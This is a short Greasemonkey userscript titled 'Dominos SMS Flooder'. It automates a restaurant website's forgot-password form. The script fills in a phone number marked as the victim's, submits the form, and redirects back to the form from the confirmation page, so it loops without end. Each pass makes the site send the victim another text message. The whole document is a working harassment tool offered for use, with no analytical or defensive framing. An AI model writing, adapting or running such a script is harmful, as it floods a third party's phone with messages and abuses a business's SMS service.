// ==UserScript==
// @name           Dominos SMS Flooder :P
// @namespace      Vinayak
// @description    SMS Flooder
// @include        http://www.uppercrust.co.in/forgotpass.asp
// @include        http://www.uppercrust.co.in/thankspass.asp?msgType=%20contact%20number
// ==/UserScript==

var number="10digitnumber"; //Victim

if(document.location=="http://www.uppercrust.co.in/forgotpass.asp")
{
	document.forms[0].elements[1].value=number;
	document.forms[0].elements[2].click();
}
else if(document.location=="http://www.uppercrust.co.in/thankspass.asp?msgType=%20contact%20number")
{
	document.location="http://www.uppercrust.co.in/forgotpass.asp";
}